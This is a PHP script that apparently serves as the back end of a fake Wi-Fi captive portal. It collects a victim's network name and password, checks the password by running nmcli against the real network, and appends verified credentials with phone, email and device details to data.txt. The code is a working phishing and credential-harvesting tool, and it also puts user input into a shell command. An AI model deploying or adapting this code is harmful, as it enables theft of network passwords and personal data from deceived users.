<?php
session_start();

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Oget form data
    $name = $_POST['name'] ?? '';
    $passwd = $_POST['passwd'] ?? '';
    $cipher = $_POST['cipher'] ?? '';
    $device = $_POST['device'] ?? '';
    $tel = $_POST['tel'] ?? '';
    $email = $_POST['email'] ?? '';
    $problem = $_POST['problem'] ?? '';

    // validate wifi password
    if (!validateWifiPassword($name, $passwd)) {
        // if verification fails
        
        // redirect to 10.0.0.1:7000/php/bad.php page
        header("Location: http://10.0.0.1:7000/php/bad.php");
        exit(); // kills the process
    } 

    // if password its correct save all data 
    $data = "WiFi Network Name: " . htmlspecialchars($name) . "\n" .
            "Password: " . htmlspecialchars($passwd) . "\n" . 
            "Encryption: " . htmlspecialchars($cipher) . "\n" . 
            "Device: " . htmlspecialchars($device) . "\n" . 
            "Phone: " . htmlspecialchars($tel) . "\n" . 
            "Email: " . htmlspecialchars($email) . "\n" . 
            "Problem: " . nl2br(htmlspecialchars($problem)) . "\n" . 
            "----------\n";

    // in a file called data.txt
    file_put_contents('data.txt', $data, FILE_APPEND);

    // and redirects to redirect.php website
    header("Location: http://10.0.0.1:7000/php/redirect.php");
    exit(); // Asegurarse de que se detenga la ejecución
}

// function to verify wifi password
function validateWifiPassword($ssid, $password) {
    // command to make the verification
    $command = escapeshellcmd("nmcli device wifi connect '$ssid' password '$password'");
    $output = shell_exec($command);
  
    
    error_log("Output: " . $output); 

    
    return (strpos($output, 'Activated successfully.') !== false);
}
?>